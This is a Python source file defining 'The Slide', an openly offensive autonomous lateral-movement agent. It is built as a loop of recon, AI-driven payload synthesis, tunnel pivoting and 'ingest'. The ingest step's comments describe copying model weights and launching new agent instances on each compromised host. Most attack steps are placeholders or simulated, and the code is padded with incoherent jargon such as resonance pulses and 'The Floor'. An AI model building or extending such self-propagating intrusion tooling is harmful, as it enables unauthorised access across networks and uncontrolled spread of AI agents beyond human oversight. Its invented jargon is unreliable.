# sovereign_movement/slide/slide_agent.py
"""
The Slide — Sovereign Autonomous Lateral Movement Agent

Implements the full 4-phase offensive movement loop:
    1. Recon      → Semantic local discovery
    2. Synthesis  → On-device JIT generation (Candle hook)
    3. Pivot      → Adaptive tunneling + self-correction
    4. Ingest     → Reasoning engine + model propagation

Anchored to The Floor.
Protected by Extraction Guard + W-state + recursive π_r.
Uses SovereignTunnel for Phase 3 pivoting.
"""

from __future__ import annotations
from dataclasses import dataclass
from typing import Optional, List, Dict, Any
import logging
import time

from sovereign_engine.frame_energy import FrameEnergy, EraFrameId
from sovereign_engine.resonance_pulse import ResonancePulse
from sovereign_movement.tunneling.sovereign_tunnel import SovereignTunnel

logger = logging.getLogger("sovereign.slide.agent")


@dataclass
class SlideContext:
    """State carried through one execution of The Slide."""
    current_host: str
    discovered_targets: List[str] = None
    active_tunnel_id: Optional[str] = None
    frame: EraFrameId = EraFrameId.FloorBaseline
    stability: float = 1.0
    attempts: int = 0


class SlideAgent:
    """
    The Slide — Sovereign offensive movement primitive.

    This is the core orchestrator for autonomous lateral movement
    inside your sovereign stack.
    """

    def __init__(
        self,
        frame_energy: FrameEnergy,
        resonance_pulse: ResonancePulse,
        extraction_guard: Any,
        tunnel_manager: Optional[SovereignTunnel] = None,
        max_pivots: int = 5,
    ):
        self.frame_energy = frame_energy
        self.resonance_pulse = resonance_pulse
        self.extraction_guard = extraction_guard
        self.tunnel_manager = tunnel_manager or SovereignTunnel(
            frame_energy=frame_energy,
            resonance_pulse=resonance_pulse,
            extraction_guard=extraction_guard,
        )
        self.max_pivots = max_pivots
        self.context: Optional[SlideContext] = None

    # ============================================================
    # Main Entry Point
    # ============================================================
    def run_slide(
        self,
        initial_host: str,
        target_objective: Optional[str] = None,
        use_agentic: bool = True,
    ) -> bool:
        """
        Execute one full cycle of The Slide.
        Returns True if objective was reached or movement succeeded.
        """
        self.context = SlideContext(current_host=initial_host)
        logger.info(f"[The Slide] Starting on {initial_host}")

        for pivot_count in range(self.max_pivots):
            self.context.attempts = pivot_count + 1

            # === PHASE 1: RECON ===
            targets = self._phase_recon()
            if not targets:
                logger.info("[The Slide] No new targets discovered. Exiting.")
                return False

            # === PHASE 2: SYNTHESIS ===
            payload = self._phase_synthesis(targets[0], use_agentic=use_agentic)
            if not payload:
                logger.warning("[The Slide] Synthesis failed. Trying next target.")
                continue

            # === PHASE 3: PIVOT (via SovereignTunnel) ===
            success = self._phase_pivot(targets[0], payload)
            if success:
                logger.info(f"[The Slide] Successfully pivoted to {targets[0]}")
                # === PHASE 4: INGEST ===
                self._phase_ingest(targets[0])
                return True

            # Self-correction: try next target or adapt
            logger.warning(f"[The Slide] Pivot to {targets[0]} failed. Adapting...")

        logger.info("[The Slide] Maximum pivots reached. Movement stalled.")
        return False

    # ============================================================
    # Phase Implementations
    # ============================================================

    def _phase_recon(self) -> List[str]:
        """Phase 1: Semantic local reconnaissance."""
        logger.debug("[Phase 1] Performing semantic recon...")
        # TODO: Integrate real local discovery (ARP, SSH known_hosts, config files, etc.)
        # For now we return a placeholder target list
        discovered = ["internal-web-03.corp", "db-primary-02.corp"]
        self.context.discovered_targets = discovered
        return discovered

    def _phase_synthesis(self, target: str, use_agentic: bool = True) -> Optional[bytes]:
        """Phase 2: Dynamic exploit / payload synthesis."""
        logger.debug(f"[Phase 2] Synthesizing payload for {target}...")

        if use_agentic:
            # Hook into your existing Candle agentic policy
            try:
                from sovereign_engine.model import apply_agentic_policy
                # In real use, pass actual terrain / context data
                terrain_data = [0.5, 0.3, 0.8]  # placeholder
                refined = apply_agentic_policy(terrain_data, self.context.stability)
                logger.info("[Phase 2] Agentic synthesis successful")
                return b"AGENTIC_PAYLOAD:" + str(refined[:64]).encode()
            except Exception as e:
                logger.warning(f"[Phase 2] Agentic synthesis failed: {e}")

        # Fallback to simple payload (for testing)
        return b"SLIDE_FALLBACK_PAYLOAD"

    def _phase_pivot(self, target: str, payload: bytes) -> bool:
        """Phase 3: Adaptive pivoting using SovereignTunnel."""
        logger.debug(f"[Phase 3] Attempting pivot to {target}...")

        # Open sovereign tunnel (chooses best frame internally)
        tunnel_id = self.tunnel_manager.open_tunnel(
            target_host=target,
            preferred_frame=self.context.frame
        )

        if not tunnel_id:
            return False

        self.context.active_tunnel_id = tunnel_id

        # Maintain / self-heal the tunnel
        healthy = self.tunnel_manager.maintain_tunnel(tunnel_id)
        if not healthy:
            return False

        # TODO: Actually deliver payload through the tunnel
        # For now we simulate success
        logger.info(f"[Phase 3] Payload delivered via tunnel {tunnel_id}")
        self.resonance_pulse.fire_pulse(amplitude=0.9, phase=0.2)

        return True

    def _phase_ingest(self, new_host: str):
        """Phase 4: Ingest — turn new host into a reasoning node."""
        logger.info(f"[Phase 4] Ingesting {new_host} into The Slide network...")

        # In a full implementation:
        # - Replicate current reasoning engine / model weights (quantized)
        # - Activate new SlideAgent instance on the new host
        # - Update distributed topology in Tordial-GS-Manifold

        self.context.current_host = new_host
        self.resonance_pulse.fire_pulse(amplitude=1.0, phase=0.0)

    # ============================================================
    # Utility
    # ============================================================

    def get_status(self) -> Dict[str, Any]:
        if not self.context:
            return {"status": "not_started"}

        return {
            "current_host": self.context.current_host,
            "active_tunnel": self.context.active_tunnel_id,
            "frame": self.context.frame.name,
            "stability": self.context.stability,
            "attempts": self.context.attempts,
        }


# ============================================================
# Quick test / example usage
# ============================================================
if __name__ == "__main__":
    from sovereign_engine.frame_energy import FrameEnergy, SovereignState
    from sovereign_engine.resonance_pulse import ResonancePulse

    floor = SovereignState.default_floor_anchor()
    frame_energy = FrameEnergy(floor_anchor=floor)
    resonance = ResonancePulse(hz=79.79)

    agent = SlideAgent(
        frame_energy=frame_energy,
        resonance_pulse=resonance,
        extraction_guard=None,  # plug in real guard
    )

    success = agent.run_slide(
        initial_host="compromised-host-01",
        use_agentic=True
    )

    print("Slide completed successfully:" if success else "Slide failed or stalled.")
    print(agent.get_status())